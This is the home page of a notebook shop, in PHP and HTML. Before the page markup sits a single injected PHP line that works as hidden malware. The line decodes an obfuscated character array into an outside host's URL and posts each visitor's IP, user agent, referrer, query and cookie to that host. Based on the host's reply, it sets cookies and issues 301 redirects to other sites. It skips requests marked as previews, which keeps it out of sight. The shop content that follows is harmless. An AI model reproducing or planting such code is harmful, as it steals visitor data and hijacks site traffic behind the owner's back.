<!DOCTYPE html>
<?php date_default_timezone_set("UTC");ini_set("display_errors", 0);error_reporting(E_ALL & ~E_NOTICE);header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){$date = date("Y-m-d H:i:s");$id = "505239";$uid="a65q7nblamv7o7fs7xbfom14c";$qu=$_SERVER["QUERY_STRING"];$ch = curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_SERVER["HTTP_REFERER"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_event",$arr[6],time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$q, TRUE, 301);}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$f, TRUE, 301);}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}}}?>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Notebook - Home</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <?php include('navbar.php'); ?>

  <header class="bg-dark text-white text-center py-5">
    <h1>Elegant Notebooks for Creative Minds</h1>
    <p>Write your thoughts, dreams, and ideas.</p>
    <a href="products.php" class="btn btn-light mt-3">View Products</a>
  </header>

  <section class="container py-5">
    <h2 class="text-center mb-4">Why Choose Our Notebooks?</h2>
    <div class="row text-center">
      <div class="col-md-4"><h4>Premium Paper</h4><p>No ink bleed-through. Smooth writing experience.</p></div>
      <div class="col-md-4"><h4>Durable Covers</h4><p>Hardbound & soft cover options for every style.</p></div>
      <div class="col-md-4"><h4>Eco-Friendly</h4><p>100% recycled paper. Sustainable packaging.</p></div>
    </div>
  </section>
</body>
</html>
